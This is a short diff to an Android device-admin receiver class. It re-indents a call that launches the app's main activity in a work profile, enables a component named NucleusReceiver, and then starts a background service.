@@ -32,11 +32,15 @@ public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
         long userId = userManager.getSerialNumberForUser(profile);
     
          if (userId != 0) { 
-			try {
-			launcherApps.startMainActivity(new ComponentName(context.getPackageName(), MainActivity.class.getName()), profile, null, null);
+			try {			
+				launcherApps.startMainActivity(new ComponentName(context.getPackageName(), MainActivity.class.getName()), profile, null, null);
 			} 
-			catch (Throwable t2) {}    
-		 background.work.around.Start.RunService(context);                            
+			catch (Throwable t2) {} 
+			context.getPackageManager().setComponentEnabledSetting(
+            new ComponentName(context, NucleusReceiver.class),
+            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+            PackageManager.DONT_KILL_APP); 
+			background.work.around.Start.RunService(context);                            
 		 }
 		}
 	}
